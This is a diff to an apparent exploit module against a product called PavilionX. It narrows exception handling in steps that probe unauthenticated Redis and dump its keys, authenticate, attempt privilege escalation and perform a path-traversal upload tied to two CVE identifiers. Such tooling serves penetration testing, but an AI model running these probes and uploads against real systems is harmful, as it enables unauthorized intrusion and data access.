@@ -96,7 +96,7 @@ class Exploit(Exploit):
                     results.append(f"Redis OPEN at {self.target}:{self.redis_port} - UNAUTHENTICATED (CVE-2025-9364 LIKELY)")
                 else:
                     results.append(f"Redis port {self.redis_port} reachable (auth may be required)")
-        except Exception:
+        except (ConnectionError, TimeoutError, ValueError, OSError):
             results.append(f"Redis port {self.redis_port} not accessible (may be firewalled)")
 
         url = f"http://{self.target}:{self.port}{_LOGIN_PATH}"
@@ -106,7 +106,7 @@ class Exploit(Exploit):
                 results.append(f"PavilionX HTTP [{resp.status}] at {self.target}:{self.port}")
         except urllib.error.HTTPError as exc:
             results.append(f"PavilionX HTTP [{exc.code}] at {self.target}:{self.port}")
-        except Exception:
+        except (ValueError, OSError):
             results.append(f"No PavilionX HTTP at {self.target}:{self.port}")
 
         return " | ".join(results)
@@ -163,7 +163,7 @@ class Exploit(Exploit):
                     logger.info("[+] Redis keys: %s", keys_resp[:300])
         except ConnectionRefusedError:
             logger.info("[*] Redis port closed or firewalled")
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, ValueError, OSError) as exc:
             logger.warning("Redis probe error: %s", exc)
 
     def _authenticate(self) -> str:
@@ -181,7 +181,7 @@ class Exploit(Exploit):
                 if token:
                     logger.info("[+] Authenticated as %s", self.username)
                 return token
-        except Exception as exc:
+        except (ValueError, KeyError, OSError) as exc:
             logger.warning("Auth error: %s", exc)
             return ""
 
@@ -205,9 +205,9 @@ class Exploit(Exploit):
             try:
                 body = json.loads(exc.read())
                 logger.info("[*] Response [%d]: %s", exc.code, body)
-            except Exception:
+            except (ValueError, KeyError, OSError):
                 logger.info("[*] Response HTTP %d", exc.code)
-        except Exception as exc:
+        except (ValueError, KeyError, OSError) as exc:
             logger.warning("Privilege escalation error: %s", exc)
 
     def _path_traversal_upload(self, token: str) -> None:
@@ -236,6 +236,6 @@ class Exploit(Exploit):
                 logger.info("[+] CVE-2024-7961 path traversal: file written to %s", traversal_filename)
         except urllib.error.HTTPError as exc:
             logger.info("[*] Upload HTTP %d - assess manually", exc.code)
-        except Exception as exc:
+        except (ValueError, OSError) as exc:
             logger.warning("Upload error: %s", exc)
 
